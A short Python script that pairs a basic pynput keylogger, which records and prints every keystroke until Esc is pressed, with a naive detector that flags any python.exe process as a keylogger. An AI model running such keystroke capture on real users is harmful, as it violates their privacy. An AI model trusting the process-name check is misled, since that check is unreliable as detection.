import threading
import time
import psutil
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))

def on_release(key):
    if key == Key.esc:
        return False

def run_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def detect_keylogger():
    keylogger_process_names = ['python.exe']  
    while True:
        running_processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
        for process in running_processes:
            if process['name'].lower() in keylogger_process_names:
                print(f"Potential keylogger detected: PID {process['pid']} - Name: {process['name']}")
        time.sleep(5)

if __name__ == "__main__":
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

    detect_keylogger()
